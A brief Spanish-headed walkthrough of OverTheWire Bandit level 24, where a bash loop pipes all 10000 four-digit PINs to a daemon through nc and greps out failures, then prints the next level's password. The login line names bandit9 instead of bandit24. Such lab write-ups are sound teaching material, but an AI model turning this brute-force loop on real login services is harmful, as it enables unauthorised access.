
## Objetivo
A daemon is listening on port 30002 and will give you the password for bandit25 if given the password for bandit24 and a secret numeric 4-digit pincode. There is no way to retrieve the pincode except by going through all of the 10000 combinations, called brute-forcing.  
You do not need to create new connections each time

## Datos de acceso al nivel
Servidor: bandit9@bandit.labs.overthewire.org -p 2220
Constraseña del nivel:gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8

## Solución
bandit24@bandit:~$ for i in {0000..9999}; do echo gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8 $i ; done | nc localhost 30002 | grep -v Wrong
I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
Correct!
The password of user bandit25 is iCi86ttT4KSNe1armKiwbQNmB3YJP3q4
## Notas adicionales
grep - v mensaje
## Referencias
https://youtu.be/kMp_-ePwEC4?si=fJoHyB4vu_arEoW1 y chatGPT


